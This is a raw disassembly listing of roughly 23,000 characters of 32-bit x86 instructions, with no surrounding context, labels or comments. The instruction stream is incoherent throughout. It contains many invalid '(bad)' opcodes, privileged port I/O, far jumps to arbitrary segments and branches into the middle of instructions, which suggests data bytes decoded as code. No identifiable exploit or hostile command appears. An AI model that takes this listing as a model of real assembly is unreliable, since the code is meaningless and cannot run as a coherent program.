  414631:	sub    eax,0x42b38468
  414636:	mov    WORD PTR ds:0xc1f0943f,cs
  41463c:	or     eax,0x9599e095
  414641:	cwde   
  414642:	out    dx,al
  414643:	gs test al,0x2f
  414646:	add    ebp,esp
  414648:	mov    ch,0x6a
  41464a:	inc    edi
  41464b:	out    dx,eax
  41464c:	dec    esi
  41464d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464e:	test   BYTE PTR [edi+0x7e],bl
  414651:	add    eax,0x7e9f6a04
  414656:	(bad)  
  414657:	fs es popf 
  41465a:	xor    BYTE PTR [esi-0x4c],0xaa
  41465e:	pushf  
  41465f:	inc    eax
  414660:	dec    ebx
  414661:	sbb    DWORD PTR [edx],0x7c9aa8f1
  414667:	mov    WORD PTR [eax+0x4f071c2a],ds
  41466d:	rcl    BYTE PTR [eax*1+0x4646e78b],cl
  414674:	mov    dh,0xed
  414676:	jae    0x4146e4
  414678:	push   ebx
  414679:	test   DWORD PTR [eax+0x3073d4ef],edi
  41467f:	int    0x80
  414681:	push   ebp
  414682:	imul   ebp,eax,0xffffffb3
  414685:	loopne 0x414699
  414687:	repz add al,BYTE PTR es:[esi]
  41468b:	mov    DWORD PTR [edx+0x54],esi
  41468e:	and    ebx,DWORD PTR [ecx+edi*4]
  414691:	mov    ch,0x41
  414693:	scas   al,BYTE PTR es:[edi]
  414694:	mov    esi,0xdef6eb66
  414699:	mov    esi,0xf0689405
  41469e:	inc    ebx
  41469f:	mov    al,ds:0xfeba8c48
  4146a4:	xchg   edx,eax
  4146a5:	xor    bl,ch
  4146a7:	out    dx,al
  4146a8:	mov    ebx,0xdc85800
  4146ad:	mov    ds:0xd2c2d96b,al
  4146b2:	mov    dl,BYTE PTR [ebp+0x26d31c21]
  4146b8:	pop    ds
  4146b9:	scas   al,BYTE PTR es:[edi]
  4146ba:	stc    
  4146bb:	jmp    0xfbe8df90
  4146c0:	or     eax,0x1b613fe2
  4146c5:	aas    
  4146c6:	outs   dx,BYTE PTR ds:[esi]
  4146c7:	sub    bl,bl
  4146c9:	xchg   ecx,eax
  4146ca:	xchg   edx,eax
  4146cb:	push   ebx
  4146cc:	jle    0x414716
  4146ce:	es dec edx
  4146d0:	xchg   BYTE PTR [ecx],bl
  4146d2:	push   ebp
  4146d3:	(bad)  
  4146d4:	cwde   
  4146d5:	push   ss
  4146d6:	push   cs
  4146d7:	push   ss
  4146d8:	cs gs mov esi,0xbc1bb03e
  4146df:	sbb    ebp,ebx
  4146e1:	aas    
  4146e2:	xchg   edi,eax
  4146e3:	ret    
  4146e4:	int3   
  4146e5:	dec    edi
  4146e6:	push   esp
  4146e7:	ins    BYTE PTR es:[edi],dx
  4146e8:	push   edx
  4146e9:	leave  
  4146ea:	in     eax,0x31
  4146ec:	inc    eax
  4146ed:	into   
  4146ee:	mov    eax,ds:0xf400f96
  4146f3:	sub    BYTE PTR [ecx-0x1f90b6a1],dh
  4146f9:	sub    al,0xe8
  4146fb:	add    edi,DWORD PTR [esi-0x58]
  4146fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146ff:	ret    
  414700:	dec    eax
  414701:	jbe    0x4146c2
  414703:	sbb    al,0xdd
  414705:	and    al,0xdb
  414707:	jle    0x41473c
  414709:	sbb    bh,bh
  41470b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41470c:	or     BYTE PTR [ebx+0x6b12aed8],0xd9
  414713:	and    bl,al
  414715:	repz push ecx
  414717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414718:	in     al,dx
  414719:	call   0x51ac:0x7218881e
  414720:	mov    edx,0xbfbc45cf
  414725:	jle    0x4146a8
  414727:	dec    eax
  414728:	out    dx,eax
  414729:	test   eax,0xbacf9803
  41472e:	adc    DWORD PTR [edi-0x67],esi
  414731:	inc    ebp
  414732:	cmp    BYTE PTR ds:0xbcb88a60,bh
  414738:	xlat   BYTE PTR ds:[ebx]
  414739:	(bad)  
  41473a:	dec    ecx
  41473b:	add    eax,0x398f3c5c
  414740:	mov    ah,0xe0
  414742:	pushf  
  414743:	adc    al,0xfc
  414745:	xchg   BYTE PTR [ecx],ah
  414747:	pop    esp
  414748:	pop    ds
  414749:	jno    0x414711
  41474b:	push   0x44c0a6c9
  414750:	in     al,dx
  414751:	and    al,0x49
  414753:	jns    0x41471c
  414755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414756:	lea    esp,[ebx]
  414758:	cs dec esp
  41475a:	les    ebx,FWORD PTR [edx+0x4c]
  41475d:	loop   0x4146fe
  41475f:	sub    esp,0x4
  414762:	popf   
  414763:	pop    ds
  414764:	retf   0xa5ba
  414767:	xor    al,BYTE PTR [edx]
  414769:	jl     0x414773
  41476b:	ror    eax,1
  41476d:	dec    edi
  41476e:	dec    esi
  41476f:	mov    eax,ds:0x8778e80
  414774:	shl    ch,0xf8
  414777:	ja     0x4147f3
  414779:	mov    dh,0x92
  41477b:	cmp    eax,0xce0dd173
  414780:	test   BYTE PTR [edx+0x23ccb316],bl
  414786:	adc    DWORD PTR [edi],edi
  414788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41478a:	cld    
  41478b:	test   BYTE PTR [ebp+eiz*2-0x64d3578e],dh
  414792:	xchg   BYTE PTR [esi+edx*8+0x5bc69e49],bl
  414799:	retf   
  41479a:	and    al,0x6a
  41479c:	ja     0x414792
  41479e:	jo     0x414791
  4147a0:	fisub  DWORD PTR [ecx-0x31a50abb]
  4147a6:	adc    DWORD PTR [esi+0x54],eax
  4147a9:	add    al,0xe7
  4147ab:	mov    dl,BYTE PTR [eax]
  4147ad:	daa    
  4147ae:	push   ebx
  4147af:	(bad)  
  4147b0:	inc    esp
  4147b1:	lods   eax,DWORD PTR ds:[esi]
  4147b2:	mov    ebp,0x14833e4
  4147b7:	push   esp
  4147b8:	pop    esp
  4147b9:	pop    ds
  4147ba:	test   eax,0x6ee6b592
  4147bf:	adc    bh,cl
  4147c1:	pusha  
  4147c2:	xchg   edx,eax
  4147c3:	cwde   
  4147c4:	fwait
  4147c5:	ja     0x414754
  4147c7:	and    ecx,ebx
  4147c9:	jb     0x4147f9
  4147cb:	and    al,0xaf
  4147cd:	add    BYTE PTR ds:0x5914baf2,cl
  4147d3:	test   al,0xf
  4147d5:	xor    DWORD PTR [ecx-0x71753e6a],eax
  4147db:	pop    ebx
  4147dc:	sub    dh,BYTE PTR [edi+0x7b]
  4147df:	pop    eax
  4147e0:	add    al,bh
  4147e2:	push   0xffffffa3
  4147e4:	pop    ecx
  4147e6:	pusha  
  4147e7:	pop    edx
  4147e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e9:	fwait
  4147ea:	stos   DWORD PTR es:[edi],eax
  4147eb:	cmp    eax,0x39b5897
  4147f0:	das    
  4147f1:	dec    ebp
  4147f2:	add    DWORD PTR [eax],esi
  4147f4:	xlat   BYTE PTR ds:[ebx]
  4147f5:	and    edi,DWORD PTR [ecx-0x575b4b1f]
  4147fb:	inc    edi
  4147fc:	fst    DWORD PTR [esi+ebx*2+0x46e01e4b]
  414803:	icebp  
  414804:	addr16 pop ecx
  414806:	fwait
  414807:	bound  esp,QWORD PTR [ebp-0x3c12067b]
  41480d:	or     BYTE PTR [edx+edx*4-0x4f],0x4a
  414812:	ret    0x5951
  414815:	inc    esp
  414816:	pusha  
  414817:	pop    edi
  414818:	cmp    BYTE PTR [edx],bl
  41481a:	mov    ah,0x91
  41481c:	mov    al,0x94
  41481e:	mov    BYTE PTR [edx-0x66f5846f],ch
  414824:	daa    
  414825:	and    al,0xc4
  414827:	mov    esp,0xb9fb3204
  41482c:	mov    dl,0x65
  41482e:	jmp    0x498e:0xdb81587d
  414835:	add    eax,0x8315f476
  41483a:	inc    edi
  41483b:	sub    ch,bh
  41483d:	jle    0x4148b8
  41483f:	in     eax,0xbd
  414841:	mov    ch,0xcc
  414843:	icebp  
  414844:	std    
  414845:	mov    esi,DWORD PTR [edi]
  414847:	xchg   edi,eax
  414848:	out    dx,eax
  414849:	test   BYTE PTR [edi+0x6da4ff4d],dh
  41484f:	dec    ebp
  414850:	push   esp
  414851:	dec    esi
  414852:	jno    0x4147fb
  414854:	cdq    
  414855:	sbb    cl,BYTE PTR gs:0xc4f93a38
  41485c:	data16 xchg dl,bl
  41485f:	dec    ebp
  414860:	es jb  0x4147e8
  414863:	inc    edx
  414864:	jmp    DWORD PTR es:[ecx+0x5569044]
  41486b:	pop    es
  41486c:	xor    bh,BYTE PTR [edi]
  41486e:	mov    DWORD PTR [eax],esi
  414870:	mov    ds:0x3b6af5d1,eax
  414875:	push   esi
  414876:	js     0x414842
  414878:	nop
  414879:	pop    ebp
  41487a:	daa    
  41487b:	xchg   ebx,eax
  41487c:	pop    eax
  41487d:	sub    BYTE PTR [ebp+0x2df6d0e4],0x3d
  414884:	fistp  DWORD PTR [esi+0x9]
  414887:	mov    gs,WORD PTR [edi-0x6955bf13]
  41488d:	fild   WORD PTR [edi+0x28]
  414890:	daa    
  414891:	mov    dl,0x87
  414893:	or     al,0xe6
  414895:	dec    eax
  414896:	adc    al,0x83
  414898:	imul   esp,DWORD PTR ds:0xf3ff1b62,0xea73a7dd
  4148a2:	cld    
  4148a3:	mov    ebp,0xbd5a3adf
  4148a8:	(bad)  
  4148a9:	outs   dx,DWORD PTR ds:[esi]
  4148aa:	mov    dh,0x6e
  4148ac:	mov    al,0x34
  4148ae:	cmc    
  4148af:	cmp    BYTE PTR [ecx+eiz*1],cl
  4148b2:	xchg   edx,eax
  4148b3:	adc    BYTE PTR [eax],ch
  4148b5:	sub    DWORD PTR [esp+ebx*8],ecx
  4148b8:	fdivr  DWORD PTR [edx-0x7f]
  4148bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148bc:	push   esp
  4148bd:	mov    eax,0x71f7a832
  4148c2:	mov    ecx,0x1ff6fbb0
  4148c7:	leave  
  4148c8:	fdiv   DWORD PTR [eax]
  4148ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148cb:	int    0xf8
  4148cd:	lahf   
  4148ce:	mov    ebx,ebp
  4148d0:	xlat   BYTE PTR ds:[ebx]
  4148d1:	add    DWORD PTR [esi-0x2fcb271c],0x40
  4148d8:	(bad)  
  4148d9:	ss retf 
  4148db:	fisubr DWORD PTR [edi]
  4148dd:	(bad)  
  4148df:	cmp    BYTE PTR [ebp-0x5c],ah
  4148e2:	cmp    ch,BYTE PTR [edi]
  4148e4:	pop    ecx
  4148e5:	inc    esi
  4148e6:	dec    ebp
  4148e7:	push   ebx
  4148e8:	push   ds
  4148e9:	push   ds
  4148ea:	mov    cl,0xe1
  4148ec:	imul   ebp,eax,0x44
  4148ef:	cli    
  4148f0:	mov    al,0x45
  4148f2:	add    al,0x6c
  4148f4:	sar    DWORD PTR [edi-0x9],0x26
  4148f8:	sub    eax,0x543d0cc9
  4148fd:	xchg   ebp,eax
  4148fe:	lods   eax,DWORD PTR ds:[esi]
  4148ff:	sahf   
  414900:	add    ebp,DWORD PTR [ebp-0x18]
  414903:	xor    ebx,edi
  414905:	jge    0x41488e
  414907:	pop    ebx
  414908:	outs   dx,DWORD PTR ds:[esi]
  414909:	(bad)  [eax]
  41490b:	fsubr  DWORD PTR [edx+0x63]
  41490e:	(bad)  
  414910:	and    al,0xb2
  414912:	sbb    dl,BYTE PTR [esi+0x3d]
  414915:	push   es
  414916:	push   esi
  414917:	push   ss
  414918:	enter  0x65a1,0x22
  41491c:	dec    ebx
  41491d:	test   ebp,edx
  41491f:	xchg   ebx,eax
  414920:	push   edx
  414921:	jae    0x4148d2
  414923:	into   
  414924:	push   ds
  414925:	mov    dh,0xd7
  414927:	or     BYTE PTR [edx-0x37873e92],dl
  41492d:	mov    esi,DWORD PTR [eax+0x43]
  414930:	jnp    0x414995
  414932:	xor    BYTE PTR [ecx+esi*1+0x6],0x14
  414937:	add    al,0xdb
  414939:	dec    esi
  41493a:	jo     0x414906
  41493c:	dec    esi
  41493d:	iret   
  41493e:	add    esp,DWORD PTR [esi-0x4c]
  414941:	mov    cl,0xb3
  414943:	dec    eax
  414944:	outs   dx,BYTE PTR ds:[esi]
  414945:	sub    al,0x15
  414947:	in     eax,dx
  414948:	rcr    WORD PTR [eax-0x2c],cl
  41494c:	xlat   BYTE PTR ds:[ebx]
  41494d:	mov    dl,BYTE PTR [esi]
  41494f:	pop    ds
  414950:	out    dx,al
  414951:	iret   
  414952:	push   ds
  414953:	cmp    cl,BYTE PTR ds:0xad8271a7
  414959:	in     eax,dx
  41495a:	daa    
  41495b:	cs imul esp,edx,0x1
  41495f:	es call 0xaa65:0xab35ce1
  414967:	loop   0x4149e0
  414969:	pop    edx
  41496a:	test   DWORD PTR [edx+esi*1],esi
  41496d:	cmp    eax,0x985ac07b
  414972:	sub    DWORD PTR [edi+edx*8+0x3979ac08],ebp
  414979:	stc    
  41497a:	imul   edx,ecx,0xb14641a3
  414980:	push   ecx
  414981:	or     eax,0x47f5f646
  414986:	jmp    0x414a06
  414988:	rol    BYTE PTR [edx],cl
  41498a:	cmp    DWORD PTR [ebx+0x7a],esp
  41498d:	xchg   edx,eax
  41498e:	sub    al,0x3b
  414990:	cmp    BYTE PTR [edx+eax*8],dh
  414993:	inc    edi
  414994:	cmp    edx,ebx
  414996:	das    
  414997:	push   ax
  414999:	test   DWORD PTR [esi],esi
  41499b:	mov    eax,0x55a2889b
  4149a0:	pop    es
  4149a1:	out    0xdf,eax
  4149a3:	aaa    
  4149a4:	adc    dh,0x66
  4149a7:	push   ebp
  4149a8:	mov    esp,0x70c43d8a
  4149ad:	jbe    0x414975
  4149af:	ins    BYTE PTR es:[edi],dx
  4149b0:	arpl   WORD PTR [esi+0x1b],si
  4149b3:	(bad)  
  4149b5:	jp     0x414a31
  4149b7:	sti    
  4149b8:	les    esp,FWORD PTR [ebp-0x6b959842]
  4149be:	ror    BYTE PTR [ecx+0x3683e15a],1
  4149c4:	mov    cl,0x5e
  4149c6:	add    BYTE PTR [eax+edi*8+0x446fb31f],ah
  4149cd:	jmp    0x7534:0x764e715e
  4149d4:	push   edi
  4149d5:	add    edx,DWORD PTR ds:0x4b67821a
  4149db:	in     eax,dx
  4149dc:	xor    eax,DWORD PTR [ecx+0x13]
  4149df:	les    edx,FWORD PTR [ecx]
  4149e1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4149e3:	push   es
  4149e4:	xor    DWORD PTR [eax+edi*2+0x27],ebp
  4149e8:	ins    DWORD PTR es:[edi],dx
  4149e9:	(bad)  
  4149ea:	mov    WORD PTR [edi],cs
  4149ec:	and    DWORD PTR [ebx-0x807b426],esi
  4149f2:	pop    edx
  4149f3:	add    al,al
  4149f5:	dec    edi
  4149f6:	popf   
  4149f7:	mov    ds:0xd8d8806c,al
  4149fc:	cli    
  4149fd:	jno    0x414a53
  4149ff:	sbb    edx,ecx
  414a01:	inc    ebx
  414a02:	stos   DWORD PTR es:[edi],eax
  414a03:	xor    DWORD PTR ds:0xdd3c7745,0xfffffff1
  414a0a:	jecxz  0x414a1d
  414a0c:	repz in al,dx
  414a0e:	mov    eax,ds:0x167e0e0c
  414a13:	fisttp DWORD PTR [edx+0x23]
  414a16:	mov    al,0xff
  414a18:	mov    DWORD PTR es:[edx-0x2f],ebx
  414a1c:	jecxz  0x4149a9
  414a1e:	out    dx,eax
  414a1f:	retf   
  414a20:	mov    esp,0xb406b3da
  414a25:	pop    esi
  414a26:	sbb    al,al
  414a28:	call   0x463762a
  414a2d:	ficomp WORD PTR [esi-0x73]
  414a30:	out    dx,al
  414a31:	ins    BYTE PTR es:[edi],dx
  414a32:	adc    al,0x99
  414a34:	mov    al,BYTE PTR [eax+0x7c6cd2fb]
  414a3a:	pop    ds
  414a3b:	out    dx,al
  414a3c:	xor    DWORD PTR [esi-0x3830c28e],ebx
  414a42:	xor    DWORD PTR [esi+0x282c31cf],ecx
  414a48:	xchg   esi,eax
  414a49:	inc    esi
  414a4a:	imul   ecx,DWORD PTR [eax+0x2a],0xe20ec1f6
  414a51:	xor    al,0xd4
  414a53:	cs mov dh,0x26
  414a56:	call   0x610f20c2
  414a5b:	ret    0xdcf
  414a5e:	add    BYTE PTR [eax-0x27],ch
  414a61:	dec    edx
  414a62:	mov    esi,0xf159c393
  414a67:	jle    0x414ac9
  414a69:	mov    cl,0xc5
  414a6b:	sbb    al,0x49
  414a6d:	add    ebp,edi
  414a6f:	std    
  414a70:	cmp    ah,BYTE PTR [edx]
  414a72:	jo     0x414a84
  414a74:	lea    ecx,es:[ecx+0x45c1f332]
  414a7b:	and    eax,0xd05f3e45
  414a80:	jae    0x414a70
  414a82:	mov    edi,0xa9aa334
  414a87:	cmp    BYTE PTR [edx+0x31],al
  414a8a:	ds push 0x1aeb140f
  414a90:	mov    esp,0x50fcdc3f
  414a95:	test   al,0x2d
  414a97:	mov    esi,0xad6c9ac9
  414a9c:	sahf   
  414a9d:	out    0x85,eax
  414a9f:	pop    edi
  414aa0:	add    bl,BYTE PTR [eax+0x12bf54d1]
  414aa6:	sub    ebp,DWORD PTR [edi+0x4d0c035a]
  414aac:	stos   DWORD PTR es:[edi],eax
  414aad:	sbb    DWORD PTR [ebp+0x65],edi
  414ab0:	sub    al,0x2d
  414ab2:	and    bh,BYTE PTR [ebp-0x73]
  414ab5:	push   esp
  414ab6:	in     al,dx
  414ab7:	xchg   esp,eax
  414ab8:	inc    eax
  414ab9:	add    DWORD PTR [ebx-0x73ad2ab5],esp
  414abf:	dec    esi
  414ac0:	int    0xd6
  414ac2:	std    
  414ac3:	mov    esi,0xd2f7f149
  414ac8:	leave  
  414ac9:	iret   
  414aca:	pop    ecx
  414acb:	xchg   edi,eax
  414acc:	nop
  414acd:	fcmovu st,st(3)
  414acf:	inc    ebx
  414ad0:	outs   dx,BYTE PTR ds:[esi]
  414ad1:	(bad)  
  414ad2:	sbb    eax,DWORD PTR [ebp+eiz*1+0x68]
  414ad6:	add    al,0xb6
  414ad8:	xor    BYTE PTR [esi-0x42bb28c5],bl
  414ade:	in     eax,dx
  414adf:	fs xor al,0xd8
  414ae3:	cmp    eax,0x95aca12d
  414ae8:	cmp    BYTE PTR [edi+0x5d],0x2a
  414aec:	jo     0x414adc
  414aee:	stos   DWORD PTR es:[edi],eax
  414aef:	stc    
  414af0:	sub    DWORD PTR [eax+edi*8],0xc9a4a685
  414af7:	ins    DWORD PTR es:[edi],dx
  414af8:	fs test eax,0x1ed9099
  414afe:	ins    DWORD PTR es:[edi],dx
  414aff:	ret    0xd6db
  414b02:	and    edi,DWORD PTR [esi+edi*4+0x35]
  414b06:	(bad)  
  414b08:	xchg   edi,eax
  414b09:	aas    
  414b0a:	sub    al,BYTE PTR [ebp+0x30]
  414b0d:	aam    0xb7
  414b0f:	(bad)  
  414b10:	in     al,dx
  414b11:	cmp    ecx,ebx
  414b13:	or     edx,0x53dc94d9
  414b19:	jle    0x414b0d
  414b1b:	xor    BYTE PTR [ecx-0x4c],dl
  414b1e:	adc    eax,0x60c847e9
  414b23:	rol    BYTE PTR [edi+edi*1-0x6f],cl
  414b27:	pusha  
  414b28:	fnstcw WORD PTR [eax-0x4b]
  414b2b:	stos   BYTE PTR es:[edi],al
  414b2c:	stos   DWORD PTR es:[edi],eax
  414b2d:	add    DWORD PTR [ebx],edi
  414b2f:	imul   ebx,DWORD PTR [eax+eiz*1+0x6adb76b9],0xffffffee
  414b37:	and    DWORD PTR [edi],0xade2c263
  414b3d:	cmp    eax,0x7b29d53c
  414b42:	pop    eax
  414b43:	jge    0x414ba0
  414b45:	nop
  414b46:	mov    al,0xe9
  414b48:	jg     0x414afb
  414b4a:	and    esp,DWORD PTR [ecx-0x58]
  414b4d:	stos   DWORD PTR es:[edi],eax
  414b4e:	pop    esp
  414b4f:	adc    eax,0x1f4e0850
  414b54:	js     0x414b05
  414b56:	pop    eax
  414b57:	push   edx
  414b58:	pop    es
  414b59:	mov    ah,0x31
  414b5b:	cwde   
  414b5c:	xchg   DWORD PTR [esi-0x31],esi
  414b5f:	(bad)  
  414b60:	int3   
  414b61:	out    dx,al
  414b62:	xor    al,0x81
  414b64:	fucomp st(4)
  414b66:	inc    ebp
  414b67:	xchg   edx,eax
  414b68:	pop    ss
  414b69:	imul   ecx,DWORD PTR [ebx+eiz*8+0x20a1f11d],0x508aa649
  414b74:	mov    ah,0xf4
  414b76:	or     eax,0x7d988bf2
  414b7b:	inc    ecx
  414b7c:	sub    al,0x7d
  414b7e:	jns    0x414b0d
  414b80:	sbb    ebp,DWORD PTR [eax]
  414b82:	aas    
  414b83:	lds    ebx,FWORD PTR [esi-0x76ce13e]
  414b89:	dec    ecx
  414b8a:	pop    eax
  414b8b:	out    dx,al
  414b8c:	jge    0x414b59
  414b8e:	pop    ecx
  414b8f:	jns    0x414c00
  414b91:	mov    ah,0x76
  414b93:	retf   0x61cf
  414b96:	repnz ficom DWORD PTR [ebx-0x54488754]
  414b9d:	cmp    BYTE PTR [ebp-0x11],0x8
  414ba1:	lds    esp,FWORD PTR [edx+0x5204f5a3]
  414ba7:	push   ebp
  414ba8:	loope  0x414bb1
  414baa:	inc    DWORD PTR [ecx]
  414bac:	shr    BYTE PTR ds:0x7841d7ff,1
  414bb2:	in     eax,0x4
  414bb4:	lds    edx,FWORD PTR [eax+0x6a246d5c]
  414bba:	add    edi,DWORD PTR [ecx-0x1b]
  414bbd:	stos   DWORD PTR es:[edi],eax
  414bbe:	mov    al,ds:0xf2618201
  414bc3:	adc    al,0x75
  414bc5:	mov    ebx,0x34e64797
  414bca:	pop    ecx
  414bcb:	push   cs
  414bcc:	inc    ecx
  414bcd:	jecxz  0x414bea
  414bcf:	push   eax
  414bd0:	(bad)  
  414bd1:	imul   eax,DWORD PTR [ecx],0x8108dea6
  414bd7:	jns    0x414bc8
  414bd9:	shl    ah,0x95
  414bdc:	icebp  
  414bdd:	test   eax,0x7beeeb12
  414be2:	push   0xfb8ad945
  414be7:	push   ecx
  414be8:	pop    ecx
  414be9:	imul   ebx,DWORD PTR [eax+eiz*1-0x23dc92c5],0x9cdb5a27
  414bf4:	pand   mm0,QWORD PTR [edi+0x14]
  414bf8:	leave  
  414bf9:	mov    DWORD PTR [ebx+0x1c],eax
  414bfc:	xchg   BYTE PTR [esi-0x266ab825],bl
  414c02:	aaa    
  414c03:	and    ch,BYTE PTR [esi+ebp*2]
  414c06:	mov    ss,WORD PTR [edi+esi*1]
  414c09:	stos   BYTE PTR es:[edi],al
  414c0a:	cdq    
  414c0b:	std    
  414c0c:	pop    ss
  414c0d:	jmp    0x414bc8
  414c0f:	pop    ds
  414c10:	pop    DWORD PTR [ecx-0x3d75d9e4]
  414c16:	les    edx,FWORD PTR [eax+0x53da513e]
  414c1c:	bnd jo 0x414c09
  414c1f:	test   ah,cl
  414c21:	push   es
  414c22:	dec    ebp
  414c23:	jecxz  0x414c1b
  414c25:	or     cl,BYTE PTR [esi-0x6d]
  414c28:	ret    
  414c29:	std    
  414c2a:	cmp    eax,0x3433fa7f
  414c2f:	cmp    al,0x72
  414c31:	stc    
  414c32:	pusha  
  414c33:	sbb    BYTE PTR [esi-0x55b80ffc],al
  414c39:	jo     0x414bef
  414c3b:	push   esp
  414c3c:	std    
  414c3d:	repz or ecx,edi
  414c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c41:	push   cs
  414c42:	jbe    0x414be6
  414c44:	lock sahf 
  414c46:	test   BYTE PTR [esi-0x3],ch
  414c49:	inc    edx
  414c4a:	fdivr  st(5),st
  414c4c:	inc    edi
  414c4d:	mov    esp,0x2862faf1
  414c52:	xchg   esp,eax
  414c53:	call   0xcddd62a
  414c58:	ret    
  414c59:	stc    
  414c5a:	das    
  414c5b:	pop    edi
  414c5c:	daa    
  414c5d:	add    BYTE PTR [edx+0x28260c56],bl
  414c63:	or     edx,DWORD PTR [edi-0x2abcbe0b]
  414c69:	scas   eax,DWORD PTR es:[edi]
  414c6a:	sbb    eax,0xa0da64fc
  414c6f:	popf   
  414c70:	and    al,0x4
  414c72:	mov    edi,0x2c47e41b
  414c77:	mov    ebp,0xfe222f7e
  414c7c:	sbb    ch,BYTE PTR [edx]
  414c7e:	adc    bl,BYTE PTR [edi-0x5]
  414c81:	cmp    eax,0x6fff7b8f
  414c86:	std    
  414c87:	sbb    ebp,DWORD PTR [edi]
  414c89:	cmc    
  414c8a:	add    ecx,DWORD PTR ds:0x46eec0b3
  414c90:	int3   
  414c91:	mov    ebp,0xfeb70dd
  414c96:	mov    bh,0xe5
  414c98:	adc    DWORD PTR [ebp+0x35],edi
  414c9b:	xor    esp,DWORD PTR [ecx+edx*1]
  414c9e:	dec    esp
  414c9f:	ja     0x414c97
  414ca1:	imul   ecx,DWORD PTR [ecx+0x730a4d0b],0xbc780550
  414cab:	xchg   edx,eax
  414cac:	mov    eax,0x492f28a1
  414cb1:	fwait
  414cb2:	pop    esi
  414cb3:	xor    al,al
  414cb5:	cmp    eax,0xe74643f
  414cba:	sub    al,0xb4
  414cbc:	inc    edi
  414cbd:	push   esp
  414cbe:	or     bl,BYTE PTR [ebx-0x71]
  414cc1:	icebp  
  414cc2:	cmc    
  414cc3:	jecxz  0x414ca5
  414cc5:	mov    ebp,0x11aee4e9
  414cca:	jns    0x414d28
  414ccc:	cs ja  0x414c5f
  414ccf:	mov    esi,0x35981aa1
  414cd4:	addr16 push esi
  414cd6:	or     al,bl
  414cd8:	adc    eax,0x1243a084
  414cdd:	loopne 0x414cd5
  414cdf:	fmul   QWORD PTR [eax]
  414ce1:	adc    eax,ecx
  414ce3:	mov    edi,esp
  414ce5:	fnstenv ds:0x8d73cfc1
  414ceb:	pop    es
  414cec:	(bad)
  414cf0:	push   edi
  414cf1:	pop    eax
  414cf2:	sub    al,0x8e
  414cf4:	sbb    DWORD PTR [esi],eax
  414cf6:	xor    DWORD PTR [bp-0x56],eax
  414cfa:	xlat   BYTE PTR ds:[ebx]
  414cfb:	loope  0x414ca6
  414cfd:	adc    ebx,DWORD PTR [edi-0x77db500f]
  414d03:	cmp    eax,0xa1fb5a75
  414d08:	cmp    al,0xb0
  414d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d0b:	xchg   esp,eax
  414d0c:	outs   dx,BYTE PTR ds:[esi]
  414d0d:	lock ffreep st(0)
  414d10:	jo     0x414d0f
  414d12:	push   ecx
  414d13:	sub    ch,BYTE PTR [ebx]
  414d15:	ret    
  414d16:	xor    eax,0x814eba41
  414d1b:	mov    bl,0xb2
  414d1d:	out    0x64,al
  414d1f:	in     al,0x52
  414d21:	in     eax,0xed
  414d23:	lods   eax,DWORD PTR ds:[esi]
  414d24:	mov    dh,0xc0
  414d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d27:	fisttp DWORD PTR [eax]
  414d29:	xor    BYTE PTR [ecx+0xf],dl
  414d2c:	mov    al,0xba
  414d2e:	pop    ebx
  414d2f:	fnstsw WORD PTR [edx+0x5b]
  414d32:	xor    dh,BYTE PTR ds:0xc89050a6
  414d38:	xor    DWORD PTR [ecx+0x20e699a5],edi
  414d3e:	out    0xe9,eax
  414d40:	call   0x1e66d1ba
  414d45:	int    0x9a
  414d47:	mov    edx,0xefe8f036
  414d4c:	adc    al,0xd6
  414d4e:	ins    DWORD PTR es:[edi],dx
  414d4f:	les    edx,FWORD PTR [eax+edx*8+0x50947f3e]
  414d56:	addr16 into 
  414d58:	addr16 mov ch,0xf9
  414d5b:	ret    0x8db8
  414d5e:	jns    0x414d7c
  414d60:	daa    
  414d61:	cld    
  414d62:	sti    
  414d63:	test   al,0x80
  414d65:	jle    0x414d2d
  414d67:	push   es
  414d68:	pop    edi
  414d69:	mov    ebp,0xb4092490
  414d6e:	shl    DWORD PTR [eax],0xf
  414d71:	call   0xabc22dcc
  414d76:	jne    0x414db9
  414d78:	dec    eax
  414d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d7a:	je     0x414d3b
  414d7c:	xchg   edi,edx
  414d7e:	cmp    edx,0xffffffd5
  414d81:	pop    esi
  414d82:	mov    ds:0x73aadaa9,eax
  414d87:	pop    es
  414d88:	rcr    edx,0x25
  414d8b:	and    BYTE PTR [edx+0x21dc7a2c],al
  414d91:	outs   dx,DWORD PTR ds:[esi]
  414d92:	cdq    
  414d93:	mov    ss,ebx
  414d95:	push   ebx
  414d96:	add    ecx,DWORD PTR ds:0x63b0e5cd
  414d9c:	jae    0x414d2c
  414d9e:	mov    ebp,0x88fa8223
  414da3:	add    ebp,DWORD PTR [ebx-0x6f2cac75]
  414da9:	cli    
  414daa:	mov    ebx,0xa728ccb8
  414daf:	mov    edi,ecx
  414db1:	out    dx,al
  414db2:	cmp    eax,0xffffff8a
  414db5:	fstp   TBYTE PTR [ebp+0x61]
  414db8:	xor    dl,BYTE PTR [eax]
  414dba:	fwait
  414dbb:	jo     0x414df4
  414dbd:	jp     0x414e2f
  414dbf:	test   esp,edi
  414dc1:	push   esp
  414dc2:	(bad)  
  414dc3:	mov    fs,WORD PTR [ebp+0x1e83d90b]
  414dc9:	push   ebp
  414dca:	fdivr  DWORD PTR [eax+edi*4+0x71]
  414dce:	pop    ss
  414dcf:	adc    eax,0x218e8614
  414dd4:	addr16 mov bh,0xf3
  414dd7:	fmul   QWORD PTR [esi+0x3]
  414dda:	cmp    al,bl
  414ddc:	fld    QWORD PTR [ebx]
  414dde:	rcl    BYTE PTR [ebx-0x62],0xce
  414de2:	dec    eax
  414de3:	sub    ebx,DWORD PTR [ecx]
  414de5:	outs   dx,DWORD PTR ds:[esi]
  414de6:	push   edi
